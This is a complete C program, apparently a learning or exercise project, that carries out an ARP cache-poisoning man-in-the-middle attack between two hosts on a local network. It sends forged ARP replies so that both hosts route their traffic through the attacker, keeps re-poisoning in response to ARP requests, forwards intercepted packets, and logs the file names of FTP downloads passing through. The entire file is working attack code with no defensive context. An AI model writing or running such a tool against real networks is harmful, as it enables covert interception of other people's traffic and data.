#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <libnet.h>
#include <pcap.h>
#include <arpa/inet.h> // ntohs
#include <net/ethernet.h>

u_int32_t	ip_src;
u_int8_t	*mac_src;
u_int32_t	ip_target;
u_int8_t	*mac_target;
u_int8_t	*mac_attacker;
libnet_t	*l;

void	get_args(int ac, char **av, libnet_t *l)
{
	int	len;

	if (ac != 5)
	{
		printf("Usage: %s <IP-src> <MAC-src> <IP-target> <MAC-target>\n", 
				av[0]);
		exit(0);
	}

	ip_src = libnet_name2addr4(l, av[1], LIBNET_DONT_RESOLVE);
	if (ip_src == -1) {
		fprintf(stderr, "Error converting IP source address.\n");
		libnet_destroy(l);
		exit(EXIT_FAILURE);
	}
	mac_src = libnet_hex_aton(av[2], &len);
	if (!mac_src) {
		fprintf(stderr, "Error converting MAC source address.\n");
		libnet_destroy(l);
		exit(EXIT_FAILURE);
	}
	ip_target = libnet_name2addr4(l, av[3], LIBNET_DONT_RESOLVE);
	if (ip_target == -1) {
		fprintf(stderr, "Error converting IP target address.\n");
		libnet_destroy(l);
		exit(EXIT_FAILURE);
	}
	mac_target = libnet_hex_aton(av[4], &len);
	if (!mac_target) {
		fprintf(stderr, "Error converting MAC target address.\n");
		libnet_destroy(l);
		free(mac_src);
		exit(EXIT_FAILURE);
	}
}

u_int8_t	*get_own_mac(libnet_t *l)
{
	struct libnet_ether_addr	*mac_addr;

	mac_addr = libnet_get_hwaddr(l);
	if (!mac_addr) {
		fprintf(stderr, "Couldn't get own IP address: %s\n",
				libnet_geterror(l));
		libnet_destroy(l);
		exit(EXIT_FAILURE);
	}
	
	return (mac_addr->ether_addr_octet);
}

void	send_gratuitous_arp(u_int8_t *sender_mac, u_int32_t sender_ip,
		u_int8_t *target_mac, u_int32_t target_ip, libnet_t *l)
{
	u_int8_t	mac_zero_addr[6] = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0};

	// Building ARP header
	if (libnet_autobuild_arp( ARPOP_REPLY, sender_mac,
				(u_int8_t *)(&sender_ip),
				mac_zero_addr, (u_int8_t *)(&target_ip), l) == -1)
	{
		fprintf(stderr, "Error building ARP header: %s\n", libnet_geterror(l));
		libnet_destroy(l);
		exit(EXIT_FAILURE);
	}
	// Building Ethernet header
	if (libnet_autobuild_ethernet(target_mac, ETHERTYPE_ARP, l) == -1)
	{
		fprintf(stderr, "Error building Ethernet header: %s\n",
				libnet_geterror(l));
		libnet_destroy(l);
		exit(EXIT_FAILURE);
	}
	// Writing packet
	int bytes_written;
	bytes_written = libnet_write(l);
	if (bytes_written == -1)
		fprintf(stderr, "Error writing packet: %s\n", libnet_geterror(l));
}

void packet_handler(u_char *args, const struct pcap_pkthdr *packet_header,
		const u_char *packet_body)
{
	struct ether_header *eth_header;
	eth_header = (struct ether_header *)packet_body;

	if (ntohs(eth_header->ether_type) == ETHERTYPE_ARP) // If ARP packet
	{
		u_int8_t opcode = (u_int8_t)*(packet_body + 14 + 7);
		if (opcode == 1) // If ARP request
		{
			u_int32_t target_ip = *(u_int32_t *)(packet_body + 14 + 24);
			if (target_ip == ip_target)
				send_gratuitous_arp(mac_attacker, ip_target, mac_src, ip_src, l);
			if (target_ip == ip_src)
				send_gratuitous_arp(mac_attacker, ip_src, mac_target, ip_target, l);
		}
	}
	else
	{
		if (ntohs(eth_header->ether_type) == ETHERTYPE_IP
			&& !memcmp("RETR", packet_body + 14 + 20 + 32, 4)) // ether + ip + tcp
			printf("Transfering: %s\n", (char *)packet_body+14+20+32+5);
		pcap_t *handle = (pcap_t *)args;
		pcap_inject(handle, packet_body, packet_header->caplen);
	}
}

pcap_t *open_device(char *filter_exp)
{
	char	*device;
	char	error_buffer[PCAP_ERRBUF_SIZE];
	pcap_t	*handle;

	// Get name device
	device = pcap_lookupdev(error_buffer);
	if (!device)
	{
		fprintf(stderr, "Error finding device: %s\n", error_buffer);
		exit(EXIT_FAILURE);
	}
	// Open device for live capture
	handle = pcap_open_live(device, BUFSIZ, 0, -1, error_buffer);
	if (!handle)
	{
		fprintf(stderr, "Could not open device %s: %s\n", device, error_buffer);
		exit(EXIT_FAILURE);
	}
	// Filters
	if (filter_exp)
	{
		struct bpf_program filter;
		if (pcap_compile(handle, &filter, filter_exp, 0, 0) == -1)
		{
			fprintf(stderr, "Bad filter - %s\n", pcap_geterr(handle));
			exit(EXIT_FAILURE);
		}
		if (pcap_setfilter(handle, &filter) == -1)
		{
			fprintf(stderr, "Error setting filter - %s\n", pcap_geterr(handle));
			exit(EXIT_FAILURE);
		}
	}
	return (handle);
}

int main(int ac, char **av)
{
	char		errbuf[LIBNET_ERRBUF_SIZE];

	l = libnet_init(LIBNET_LINK, NULL, errbuf);
	if (!l) {
		fprintf(stderr, "libnet_init() failed: %s\n", errbuf);
		exit(EXIT_FAILURE);
	}

	// Get ip and mac addresses
	get_args(ac, av, l);
	mac_attacker = get_own_mac(l);

	send_gratuitous_arp(mac_attacker, ip_src, mac_target, ip_target, l);
	send_gratuitous_arp(mac_attacker, ip_target, mac_src, ip_src, l);

	printf("Listening...\n");

	/*pcap_t *handle = open_device("arp and arp[6:2] == 1"); // Arp request*/
	pcap_t *handle = open_device(NULL);
	pcap_loop(handle, 0, packet_handler, (u_char *)handle);

	pcap_close(handle);
	free(mac_src);
	free(mac_target);
	libnet_destroy(l);
}
